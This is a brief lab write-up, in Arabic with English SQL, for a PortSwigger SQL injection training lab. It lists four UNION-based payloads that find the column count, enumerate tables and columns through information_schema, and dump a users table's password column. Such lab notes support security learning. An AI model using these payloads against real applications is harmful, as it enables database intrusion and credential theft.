# Lab: SQL injection attack, listing the database contents on non-Oracle databases

https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

- الفكره من الLab ده انك تعرض المحتوي من database
- الصعوبه تكمن في تحديد عدد col الي هستخدمها مع union

```bash
1. 'union select null,null-- - => صح colلحاد اما تطبع ساعتها هعرف انه جبت عدد ال null  هقعد اكرر في 

2. 'union select null,table_name from information_schema.tables-- - ==> Database الي في table بيظهر كل

3. 'union select null,column_name from information_schema.columns where table_name='users_heacxm'-- -  ==> المعطي tableالخاص ب column بيظهر ال

4. 'union select null,password_fvosqf from users_heacxm-- - => column و tableبيظهر المحتوي الخاص ب
```
